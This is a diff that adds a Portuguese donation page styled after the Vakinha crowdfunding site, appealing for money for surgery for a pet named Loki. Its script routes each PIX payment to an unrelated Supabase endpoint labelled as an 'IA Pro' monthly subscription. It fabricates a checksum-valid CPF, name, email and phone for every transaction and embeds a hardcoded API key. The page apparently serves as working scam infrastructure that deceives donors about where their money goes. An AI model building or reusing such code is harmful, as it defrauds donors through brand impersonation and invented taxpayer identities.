@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Doar - A dor do Loki não pode esperar. | Vakinha</title>
+  <meta name="description" content="Plataforma de crowdfunding para ajudar quem precisa.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" href="../images/favicon.png">
+  <link rel="apple-touch-icon" href="../images/favicon.png">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #f0f0f0;
+      --card: #ffffff;
+      --border: #e5e7eb;
+      --foreground: #111827;
+      --muted: #f3f4f6;
+      --muted-fg: #6b7280;
+      --primary: #008D00;
+      --primary-dark: #006f00;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--foreground);
+      min-height: 100vh;
+    }
+
+    /* HEADER */
+    header {
+      background: var(--card);
+      border-bottom: 1px solid var(--border);
+      height: 48px;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+    }
+    .back-link {
+      display: inline-flex; align-items: center; gap: 4px;
+      font-size: 0.875rem; color: var(--foreground);
+      text-decoration: none; font-weight: 500;
+    }
+    .back-link svg { width: 16px; height: 16px; }
+
+    /* PAGE */
+    .page {
+      max-width: 560px;
+      margin: 32px auto;
+      padding: 0 16px 64px;
+    }
+
+    /* MAIN CARD */
+    .main-card {
+      background: var(--card);
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.07);
+    }
+
+    /* TOP SECTION */
+    .top-section {
+      padding: 24px 24px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .top-row {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    /* CIRCULAR PROGRESS */
+    .circle-wrap {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      flex-shrink: 0;
+    }
+    .circle-wrap svg {
+      transform: rotate(-90deg);
+      width: 80px;
+      height: 80px;
+    }
+    .circle-bg { fill: none; stroke: #e5e7eb; stroke-width: 6; }
+    .circle-fill {
+      fill: none;
+      stroke: var(--primary);
+      stroke-width: 6;
+      stroke-linecap: round;
+      stroke-dasharray: 213.6;
+      stroke-dashoffset: 163.4;
+      transition: stroke-dashoffset 0.6s ease;
+    }
+    .circle-label {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: var(--primary);
+    }
+
+    /* LOKI PHOTO */
+    .loki-photo {
+      width: 110px;
+      height: 80px;
+      border-radius: 10px;
+      object-fit: cover;
+      display: block;
+    }
+
+    .remaining-text {
+      font-size: 0.875rem;
+      color: var(--muted-fg);
+      text-align: center;
+    }
+    .remaining-text strong { color: var(--foreground); }
+
+    /* AMOUNT CARDS */
+    .amounts-list {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .amount-item {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--border);
+      cursor: pointer;
+      transition: background 0.12s;
+      border-left: 3px solid transparent;
+    }
+    .amount-item:last-child { border-bottom: none; }
+    .amount-item:hover { background: rgba(0,141,0,0.04); }
+    .amount-item.selected {
+      background: rgba(0,141,0,0.06);
+      border-left-color: var(--primary);
+    }
+
+    .amount-badge {
+      background: var(--primary);
+      color: #fff;
+      font-size: 0.875rem;
+      font-weight: 700;
+      border-radius: 10px;
+      padding: 8px 12px;
+      min-width: 64px;
+      text-align: center;
+      flex-shrink: 0;
+    }
+
+    .amount-desc {
+      font-size: 0.875rem;
+      color: var(--foreground);
+      line-height: 1.4;
+      display: flex;
+      align-items: flex-start;
+      gap: 6px;
+    }
+    .amount-desc .heart {
+      color: var(--primary);
+      font-size: 1rem;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* CUSTOM VALUE */
+    .custom-section {
+      padding: 16px 20px 20px;
+      border-top: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .custom-label {
+      font-size: 0.8rem;
+      color: var(--muted-fg);
+    }
+    .custom-input-row {
+      display: flex;
+      gap: 8px;
+      align-items: stretch;
+    }
+    .input-wrap {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      transition: border-color 0.15s;
+    }
+    .input-wrap:focus-within {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(0,141,0,0.12);
+    }
+    .input-prefix {
+      padding: 0 12px;
+      font-size: 0.875rem;
+      color: var(--muted-fg);
+      background: var(--muted);
+      border-right: 1px solid var(--border);
+      height: 100%;
+      display: flex;
+      align-items: center;
+      font-weight: 500;
+    }
+    .input-wrap input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 12px;
+      font-size: 0.875rem;
+      font-family: inherit;
+      color: var(--foreground);
+      background: transparent;
+    }
+    .input-wrap input::placeholder { color: var(--muted-fg); }
+
+    .btn-doar {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 0 24px;
+      font-size: 0.9rem;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.03em;
+      transition: background 0.15s;
+      white-space: nowrap;
+    }
+    .btn-doar:hover { background: var(--primary-dark); }
+    .btn-doar:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* PROTECTION */
+    .protection-section {
+      padding: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      border-top: 1px solid var(--border);
+    }
+    .shield-icon {
+      width: 40px; height: 40px;
+      background: rgba(0,141,0,0.1);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .shield-icon svg { width: 20px; height: 20px; stroke: var(--primary); }
+    .protection-text h3 { font-size: 0.9rem; font-weight: 700; margin-bottom: 4px; }
+    .protection-text p { font-size: 0.8rem; color: var(--muted-fg); line-height: 1.5; }
+
+    /* OVERLAY */
+    .overlay {
+      display: none;
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.55);
+      z-index: 100;
+      align-items: flex-end;
+      justify-content: center;
+    }
+    .overlay.open { display: flex; }
+    @media (min-width: 600px) { .overlay { align-items: center; } }
+
+    /* MODAL */
+    .pix-modal {
+      background: var(--card);
+      border-radius: 24px 24px 0 0;
+      padding: 20px 24px 36px;
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-height: 95vh;
+      overflow-y: auto;
+      position: relative;
+    }
+    @media (min-width: 600px) { .pix-modal { border-radius: 20px; } }
+
+    /* Botão X */
+    .close-btn {
+      position: absolute; top: 16px; right: 16px;
+      background: var(--muted); border: none; border-radius: 50%;
+      width: 30px; height: 30px;
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer; transition: background 0.15s;
+    }
+    .close-btn:hover { background: var(--border); }
+    .close-btn svg { width: 13px; height: 13px; }
+
+    /* Label e valor */
+    .modal-valor-label {
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      color: var(--muted-fg);
+      text-transform: uppercase;
+      margin-top: 10px;
+      margin-bottom: 4px;
+    }
+    .pix-amount {
+      font-size: 2.4rem;
+      font-weight: 800;
+      color: var(--foreground);
+      margin-bottom: 20px;
+    }
+
+    /* LOADING */
+    .loading-state {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      padding: 30px 0;
+    }
+    .spinner {
+      width: 40px; height: 40px;
+      border: 3px solid var(--border);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-state p { font-size: 0.875rem; color: var(--muted-fg); }
+
+    /* ERRO */
+    .error-state {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      padding: 16px 0;
+      text-align: center;
+    }
+    .error-icon {
+      width: 44px; height: 44px;
+      background: #fee2e2; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .error-icon svg { width: 22px; height: 22px; stroke: #dc2626; }
+    .error-state p { font-size: 0.875rem; color: var(--muted-fg); }
+    .btn-retry {
+      background: var(--primary); color: #fff;
+      border: none; border-radius: 10px;
+      padding: 12px 28px; font-size: 0.875rem; font-weight: 600;
+      cursor: pointer; font-family: inherit; transition: background 0.15s;
+    }
+    .btn-retry:hover { background: var(--primary-dark); }
+
+    /* CONTEÚDO PIX */
+    .pix-content {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+
+    /* QR Code */
+    .qr-box {
+      width: 220px; height: 220px;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      display: flex; align-items: center; justify-content: center;
+      background: #fff;
+      margin-bottom: 18px;
+    }
+    .qr-box img { width: 100%; height: 100%; object-fit: contain; }
+
+    /* Instrução */
+    .modal-instrucao {
+      font-size: 0.8rem;
+      color: var(--muted-fg);
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    /* Código PIX */
+    .pix-code-box {
+      width: 100%;
+      background: var(--muted);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 14px;
+    }
+    .pix-code-text {
+      font-family: monospace;
+      font-size: 0.72rem;
+      word-break: break-all;
+      color: var(--foreground);
+      display: block;
+    }
+
+    /* Botão copiar grande */
+    .btn-copiar-pix {
+      width: 100%;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.15s;
+      margin-bottom: 14px;
+      font-family: inherit;
+    }
+    .btn-copiar-pix:hover { background: var(--primary-dark); }
+    .btn-copiar-pix.copied { background: #005800; }
+
+    /* Validade */
+    .expires-info {
+      font-size: 0.78rem;
+      color: var(--muted-fg);
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <a href="../index.html" class="back-link">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path d="m15 18-6-6 6-6"/></svg>
+      Campanha
+    </a>
+  </header>
+
+  <div class="page">
+    <div class="main-card">
+
+      <div class="top-section">
+        <div class="top-row">
+          <div class="circle-wrap">
+            <svg viewBox="0 0 80 80">
+              <circle class="circle-bg" cx="40" cy="40" r="34"/>
+              <circle class="circle-fill" cx="40" cy="40" r="34"/>
+            </svg>
+            <div class="circle-label">24%</div>
+          </div>
+          <img class="loki-photo" src="https://i.ibb.co/3yG8fKwB/loki.jpg" alt="Loki">
+        </div>
+        <p class="remaining-text">Ainda faltam <strong>R$1.377</strong>. Ajude-nos a dar um impulso.</p>
+      </div>
+
+      <div class="amounts-list">
+        <div class="amount-item" onclick="selectCard(this, 30)">
+          <div class="amount-badge">R$30</div>
+          <p class="amount-desc"><span class="heart">💚</span> Ajuda Loki nos primeiros dias pós-cirurgia com repouso e medicação</p>
+        </div>
+        <div class="amount-item" onclick="selectCard(this, 50)">
+          <div class="amount-badge">R$50</div>
+          <p class="amount-desc"><span class="heart">💚</span> Contribui com exames de acompanhamento da recuperação do Loki</p>
+        </div>
+        <div class="amount-item" onclick="selectCard(this, 100)">
+          <div class="amount-badge">R$100</div>
+          <p class="amount-desc"><span class="heart">💚</span> Cobre os custos do procedimento cirúrgico urgente do Loki</p>
+        </div>
+        <div class="amount-item" onclick="selectCard(this, 200)">
+          <div class="amount-badge">R$200</div>
+          <p class="amount-desc"><span class="heart">💚</span> Garante internação, medicamentos pós-operatórios e cuidados 24h para Loki</p>
+        </div>
+        <div class="amount-item" onclick="selectCard(this, 15)">
+          <div class="amount-badge">R$15</div>
+          <p class="amount-desc"><span class="heart">💚</span> Pequena ajuda que alivia a dor do Loki no início do tratamento</p>
+        </div>
+        <div class="amount-item" onclick="selectCard(this, 20)">
+          <div class="amount-badge">R$20</div>
+          <p class="amount-desc"><span class="heart">💚</span> Fornece sessões de fisioterapia para recuperação completa do Loki</p>
+        </div>
+      </div>
+
+      <div class="custom-section">
+        <p class="custom-label">Ou insira outro valor (mínimo R$10)</p>
+        <div class="custom-input-row">
+          <div class="input-wrap">
+            <span class="input-prefix">R$</span>
+            <input type="number" id="customInput" placeholder="0,00" min="10" step="0.01" oninput="onCustomInput()">
+          </div>
+          <button class="btn-doar" id="btnDoar" onclick="doarAgora()">DOAR</button>
+        </div>
+      </div>
+
+      <div class="protection-section">
+        <div class="shield-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+        </div>
+        <div class="protection-text">
+          <h3>Doação protegida</h3>
+          <p>Garantimos um reembolso total por até um ano no caso raro de ocorrência de fraude.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- PIX MODAL -->
+  <div class="overlay" id="overlay" onclick="closeOverlay(event)">
+    <div class="pix-modal">
+
+      <button class="close-btn" onclick="closePix()">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5" stroke="currentColor"><path d="M18 6 6 18M6 6l12 12"/></svg>
+      </button>
+
+      <p class="modal-valor-label">VALOR DA DOAÇÃO</p>
+      <div class="pix-amount" id="pixAmountLabel">R$ 0,00</div>
+
+      <!-- LOADING -->
+      <div class="loading-state" id="loadingState">
+        <div class="spinner"></div>
+        <p>Gerando seu PIX, aguarde…</p>
+      </div>
+
+      <!-- ERRO -->
+      <div class="error-state" id="errorState">
+        <div class="error-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </div>
+        <p id="errorMsg">Não foi possível gerar o PIX. Tente novamente.</p>
+        <button class="btn-retry" onclick="retryPix()">Tentar novamente</button>
+      </div>
+
+      <!-- CONTEÚDO PIX -->
+      <div class="pix-content" id="pixContent">
+
+        <div class="qr-box">
+          <img id="qrCodeImg" src="" alt="QR Code PIX">
+        </div>
+
+        <p class="modal-instrucao">Escaneie o QR Code ou copie a chave PIX abaixo</p>
+
+        <div class="pix-code-box">
+          <span class="pix-code-text" id="pixCode"></span>
+        </div>
+
+        <button class="btn-copiar-pix" id="copyBtn" onclick="copyPix()">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:18px;height:18px"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+          Copiar Chave PIX
+        </button>
+
+        <p class="expires-info" id="expiresInfo"></p>
+
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    // ─── CONFIGURAÇÃO DA API ───────────────────────────────────────────────
+    const API_KEY = '6247fce64556c53353d113e46ff40ab6a45f3e0ba5c747aef951ba64bf575eb7';
+    const API_URL = 'https://caogvcrwvciyyhdsdgdu.supabase.co/functions/v1/transaction-purchase';
+    const PRODUTO = 'Assinatura IA Pro - Plano Mensal';
+
+    // ─── GERADOR DE CPF VÁLIDO (matemático) ───────────────────────────────
+    function gerarCPF() {
+      const n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 9));
+
+      // 1º dígito verificador
+      let soma = n.reduce((acc, val, i) => acc + val * (10 - i), 0);
+      let d1 = (soma * 10) % 11;
+      if (d1 >= 10) d1 = 0;
+
+      // 2º dígito verificador
+      soma = [...n, d1].reduce((acc, val, i) => acc + val * (11 - i), 0);
+      let d2 = (soma * 10) % 11;
+      if (d2 >= 10) d2 = 0;
+
+      return [...n, d1, d2].join('');
+    }
+
+    // ─── GERADOR DE EMAIL ANÔNIMO ──────────────────────────────────────────
+    function gerarEmail() {
+      const hash = Math.random().toString(36).substring(2, 10);
+      return `doador.${hash}@vakinha.com.br`;
+    }
+
+    // ─── GERADOR DE NOME ANÔNIMO ───────────────────────────────────────────
+    function gerarNome() {
+      const nomes = ['Ana', 'Carlos', 'Maria', 'Pedro', 'Julia', 'Lucas', 'Fernanda', 'Rafael', 'Beatriz', 'Marcos'];
+      const sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Costa', 'Pereira', 'Ferreira', 'Carvalho', 'Gomes'];
+      return `${nomes[Math.floor(Math.random() * nomes.length)]} ${sobrenomes[Math.floor(Math.random() * sobrenomes.length)]}`;
+    }
+
+    // ─── ESTADO ───────────────────────────────────────────────────────────
+    let selectedAmount = 0;
+    let currentValue   = 0;
+
+    function selectCard(el, value) {
+      document.querySelectorAll('.amount-item').forEach(i => i.classList.remove('selected'));
+      el.classList.add('selected');
+      selectedAmount = value;
+      document.getElementById('customInput').value = '';
+      if (value > 3000) { mostrarLimite(value); return; }
+      openPix(value);
+    }
+
+    function onCustomInput() {
+      document.querySelectorAll('.amount-item').forEach(i => i.classList.remove('selected'));
+      selectedAmount = parseFloat(document.getElementById('customInput').value) || 0;
+    }
+
+    function mostrarLimite(valor) {
+      const vFmt = valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      document.getElementById('limiteValor').textContent = vFmt;
+      document.getElementById('overlayLimite').style.display = 'flex';
+    }
+
+    function fecharLimite() {
+      document.getElementById('overlayLimite').style.display = 'none';
+    }
+
+    function doarAgora() {
+      const v = parseFloat(document.getElementById('customInput').value);
+      if (!v || v < 10) { alert('Por favor, insira um valor mínimo de R$10.'); return; }
+      if (v > 3000) { mostrarLimite(v); return; }
+      openPix(v);
+    }
+
+    // ─── ABRIR MODAL ──────────────────────────────────────────────────────
+    function openPix(value) {
+      currentValue = value;
+      document.getElementById('pixAmountLabel').textContent =
+        value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+      document.getElementById('loadingState').style.display  = 'flex';
+      document.getElementById('errorState').style.display    = 'none';
+      document.getElementById('pixContent').style.display    = 'none';
+
+      document.getElementById('overlay').classList.add('open');
+      document.body.style.overflow = 'hidden';
+
+      criarTransacao(value);
+    }
+
+    // ─── CRIAR TRANSAÇÃO NA API ───────────────────────────────────────────
+    async function criarTransacao(value) {
+      try {
+        const cpf   = gerarCPF();
+        const email = gerarEmail();
+        const nome  = gerarNome();
+
+        const body = {
+          api_key:        API_KEY,
+          customer_name:  nome,
+          customer_taxid: cpf,
+          customer_email: email,
+          customer_phone: '11999999999',
+          sale_amount:    value,
+          product_name:   PRODUTO
+        };
+
+        const response = await fetch(API_URL, {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify(body)
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.message || 'Erro ao gerar PIX');
+        }
+
+        const tx = data.transaction || data;
+
+        // Preenche código PIX
+        const pixCode = tx.pix_code || tx.pixCode || '';
+        document.getElementById('pixCode').textContent = pixCode;
+
+        // Preenche QR Code
+        const qrSrc = tx.qr_code_image || tx.pix_qr_code || tx.qrCodeImage || '';
+        if (qrSrc) {
+          document.getElementById('qrCodeImg').src = qrSrc;
+        }
+
+        // Expiração: hora atual + 1 hora
+        const expDt  = new Date(Date.now() + 60 * 60 * 1000);
+        const expFmt = expDt.toLocaleString('pt-BR', {
+          day: '2-digit', month: '2-digit', year: 'numeric',
+          hour: '2-digit', minute: '2-digit', second: '2-digit'
+        });
+        document.getElementById('expiresInfo').textContent = `Válido até: ${expFmt}`;
+
+        // Exibe conteúdo
+        document.getElementById('loadingState').style.display = 'none';
+        document.getElementById('pixContent').style.display   = 'flex';
+
+      } catch (err) {
+        console.error('Erro API:', err);
+        document.getElementById('loadingState').style.display = 'none';
+        document.getElementById('errorMsg').textContent =
+          err.message || 'Não foi possível gerar o PIX. Tente novamente.';
+        document.getElementById('errorState').style.display = 'flex';
+      }
+    }
+
+    function retryPix() {
+      document.getElementById('loadingState').style.display = 'flex';
+      document.getElementById('errorState').style.display   = 'none';
+      criarTransacao(currentValue);
+    }
+
+    // ─── FECHAR MODAL ─────────────────────────────────────────────────────
+    function closePix() {
+      document.getElementById('overlay').classList.remove('open');
+      document.body.style.overflow = '';
+    }
+
+    function closeOverlay(e) {
+      if (e.target === document.getElementById('overlay')) closePix();
+    }
+
+    // ─── COPIAR PIX ───────────────────────────────────────────────────────
+    function copyPix() {
+      const code = document.getElementById('pixCode').textContent;
+      const btn  = document.getElementById('copyBtn');
+      navigator.clipboard.writeText(code).then(() => {
+        btn.classList.add('copied');
+        btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:18px;height:18px"><path d="M20 6 9 17l-5-5"/></svg> Copiado!`;
+        setTimeout(() => {
+          btn.classList.remove('copied');
+          btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:18px;height:18px"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg> Copiar Chave PIX`;
+        }, 2500);
+      }).catch(() => alert('Código: ' + code));
+    }
+  </script>
+
+
+  <!-- POPUP LIMITE R$3.000 -->
+  <div id="overlayLimite" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200;align-items:center;justify-content:center;padding:20px;">
+    <div style="background:#fff;border-radius:20px;padding:32px 24px;max-width:360px;width:100%;text-align:center;display:flex;flex-direction:column;align-items:center;gap:16px;">
+      <div style="width:56px;height:56px;background:#fff7ed;border-radius:50%;display:flex;align-items:center;justify-content:center;">
+        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="#f97316"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z"/></svg>
+      </div>
+      <h3 style="font-size:1.1rem;font-weight:800;color:#111827;">Valor acima do limite</h3>
+      <p style="font-size:0.875rem;color:#6b7280;line-height:1.6;">
+        O valor de <strong id="limiteValor" style="color:#111827;"></strong> ultrapassa o limite máximo permitido para doações nesta campanha.<br><br>
+        Por segurança e transparência, aceitamos doações de até <strong style="color:#008D00;">R$ 3.000,00</strong> por transação. Se desejar contribuir com um valor maior, realize múltiplas doações.
+      </p>
+      <button onclick="fecharLimite()" style="width:100%;background:#008D00;color:#fff;border:none;border-radius:12px;padding:14px;font-size:0.95rem;font-weight:700;cursor:pointer;font-family:inherit;">Entendi</button>
+    </div>
+  </div>
+
+</body>
+</html>
